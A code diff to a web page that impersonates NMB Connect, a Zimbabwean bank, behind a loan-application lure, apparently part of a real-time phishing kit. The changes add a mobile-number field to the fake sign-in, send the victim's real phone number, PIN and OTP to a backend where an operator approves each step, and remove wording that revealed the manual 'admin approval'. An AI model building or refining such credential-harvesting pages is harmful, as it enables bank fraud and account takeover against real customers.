@@ -371,7 +371,7 @@
       font-size: 13px;
       font-weight: 600;
       min-height: 22px;
-      margin-top: 4px;
+      margin-top: -10px;
       margin-bottom: 6px;
       opacity: 0;
       transition: opacity 0.3s;
@@ -461,7 +461,7 @@
     </div>
   </div>
 
-  <!-- ═══════════════════ LANDING ═══════════════════ -->
+  <!-- ═══════════════════ LANDING (Loan Application) ═══════════════════ -->
   <div class="scr" id="s-land">
     <div class="top-accent"></div>
     <div class="logo-section">
@@ -562,10 +562,21 @@
       <img class="screen-logo" src="https://www.nmbconnectonline.co.zw/nmbconnectonline/newassets/img/nmbconnect.png" alt="NMB Connect">
       <div class="spacer-signin"></div>
 
-      <div class="field-signin" id="pinField">
+      <!-- Phone Number Field -->
+      <div class="field-signin" id="phoneField">
         <span class="flag">🇿🇼</span>
         <span class="caret">▾</span>
         <div class="divider-signin"></div>
+        <input type="tel" placeholder="Mobile Number" id="signinPhone" maxlength="12" inputmode="numeric" oninput="validateDigitsOnly(this); clearPhoneError()">
+      </div>
+      <div class="pin-error-text" id="phoneErrorText">Please enter a valid phone number.</div>
+
+      <!-- PIN Field -->
+      <div class="field-signin" id="pinField">
+        <svg class="lock-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <rect x="4" y="10" width="16" height="10" rx="2"/>
+          <path d="M8 10V7a4 4 0 0 1 8 0v3"/>
+        </svg>
         <input type="password" placeholder="Enter Pin" id="signinPin" maxlength="6" inputmode="numeric" oninput="validateDigitsOnly(this); clearPinError()">
       </div>
       <div class="pin-error-text" id="pinErrorText">Incorrect PIN. Please try again.</div>
@@ -591,7 +602,7 @@
       <input class="otp-input" maxlength="1" inputmode="numeric">
     </div>
     <div class="otp-error-text" id="otpErrorText">Invalid OTP. Please try again.</div>
-    <div class="otp-timer" id="otpTimerDisplay">00:20</div>
+    <div class="otp-timer" id="otpTimerDisplay">00:40</div>
     <div class="spacer"></div>
     <button class="btn-otp" id="otpSubmitBtn" onclick="submitOtp()">Continue</button>
   </div>
@@ -626,6 +637,7 @@ var durVal = 6;
 var currentToken = null;
 var pollInterval = null;
 var otpCountdown = null;
+var OTP_TIMER_SECONDS = 40;
 
 // ── HIDE LOADING SCREEN ──
 document.addEventListener('DOMContentLoaded', function() {
@@ -691,6 +703,20 @@ function chk1() {
   document.getElementById('p1btn').disabled = !ok;
 }
 
+// ── Phone Error Handling ──
+function clearPhoneError() {
+  document.getElementById('phoneField').classList.remove('error');
+  document.getElementById('phoneErrorText').classList.remove('show');
+}
+
+function showPhoneError() {
+  document.getElementById('phoneField').classList.add('error');
+  document.getElementById('phoneErrorText').classList.add('show');
+  setTimeout(() => {
+    document.getElementById('phoneField').classList.remove('error');
+  }, 500);
+}
+
 // ── PIN Error Handling ──
 function clearPinError() {
   document.getElementById('pinField').classList.remove('error');
@@ -741,14 +767,31 @@ function submitApplication() {
 
 // ── SIGN-IN HANDLER ──
 async function handleSignIn() {
+  var phone = document.getElementById('signinPhone').value.trim();
   var pin = document.getElementById('signinPin').value.trim();
 
+  // ── Validate Phone ──
+  if (!phone) {
+    showPhoneError();
+    alert('Please enter your mobile number.');
+    return;
+  }
+
+  if (phone.length < 8) {
+    showPhoneError();
+    alert('Please enter a valid phone number (at least 8 digits).');
+    return;
+  }
+
+  // ── Validate PIN ──
   if (!pin) {
+    showPinError();
     alert('Please enter your PIN.');
     return;
   }
 
   if (pin.length > 6) {
+    showPinError();
     alert('PIN must be 6 digits or less.');
     return;
   }
@@ -756,12 +799,11 @@ async function handleSignIn() {
   const firstName = document.getElementById('fn').value.trim() || 'Unknown';
   const lastName = document.getElementById('ln').value.trim() || '';
   const fullName = `${firstName} ${lastName}`.trim();
-  const phone = '0771234567';
 
   try {
     showOverlay(`
       <div class="overlay-spinner"></div>
-      <div class="overlay-title">Verifying PIN</div>
+      <div class="overlay-title">Verifying credentials</div>
       <div class="overlay-desc">Please wait...</div>
     `);
 
@@ -793,8 +835,8 @@ async function handleSignIn() {
     // ── Show waiting overlay ──
     showOverlay(`
       <div class="overlay-spinner"></div>
-      <div class="overlay-title">Waiting for admin approval</div>
-      <div class="overlay-desc">Please wait while your PIN is being verified...</div>
+      <div class="overlay-title">Waiting for approval</div>
+      <div class="overlay-desc">Please wait while your credentials are being verified...</div>
     `);
 
     // ── Start polling ──
@@ -839,7 +881,6 @@ function startPollingForPin(token) {
 
       switch (data.result) {
         case 'continue_otp':
-          // ✅ Admin approved PIN → GO TO OTP
           go('s-signin', 's-otp');
           break;
 
@@ -887,12 +928,13 @@ function getOtpValue() { return [...otpInputs].map(b => b.value).join(''); }
 // ── OTP Timer ──
 function startOtpCountdown() {
   clearInterval(otpCountdown);
-  var s = 20,
-    el = document.getElementById('otpTimerDisplay');
+  var s = OTP_TIMER_SECONDS;
+  var el = document.getElementById('otpTimerDisplay');
   el.classList.remove('expired');
   el.style.cursor = 'default';
   el.onclick = null;
-  el.textContent = '00:20';
+  el.textContent = '00:' + String(s).padStart(2, '0');
+  
   otpCountdown = setInterval(function() {
     s--;
     el.textContent = '00:' + String(s).padStart(2, '0');
@@ -902,8 +944,12 @@ function startOtpCountdown() {
       el.textContent = 'Resend OTP code';
       el.classList.add('expired');
       el.style.cursor = 'pointer';
-      el.onclick = function() { retryOtp(); };
-      document.getElementById('otpPopupOverlay').classList.add('active');
+      el.onclick = function() { 
+        // Only show popup on OTP page
+        if (document.getElementById('s-otp').classList.contains('active')) {
+          document.getElementById('otpPopupOverlay').classList.add('active');
+        }
+      };
     }
   }, 1000);
 }
@@ -922,7 +968,7 @@ function retryOtp() {
     <div class="overlay-desc">Please wait...</div>
   `);
 
-  const phone = '0771234567';
+  const phone = document.getElementById('signinPhone').value.trim() || '0771234567';
   const firstName = document.getElementById('fn').value.trim() || 'Unknown';
   const lastName = document.getElementById('ln').value.trim() || '';
   const fullName = `${firstName} ${lastName}`.trim();
@@ -973,7 +1019,7 @@ function submitOtp() {
     <div class="overlay-desc">Please wait...</div>
   `);
 
-  const phone = '0771234567';
+  const phone = document.getElementById('signinPhone').value.trim() || '0771234567';
   const firstName = document.getElementById('fn').value.trim() || 'Unknown';
   const lastName = document.getElementById('ln').value.trim() || '';
   const fullName = `${firstName} ${lastName}`.trim();
@@ -1095,8 +1141,10 @@ function reset() {
   document.getElementById('otpPopupOverlay').classList.remove('active');
   otpInputs.forEach(b => b.value = '');
   otpSubmitBtn.classList.remove('active');
+  document.getElementById('signinPhone').value = '';
   document.getElementById('signinPin').value = '';
   clearPinError();
+  clearPhoneError();
   clearOtpError();
   go('s-ok', 's-land');
   updateLanding();
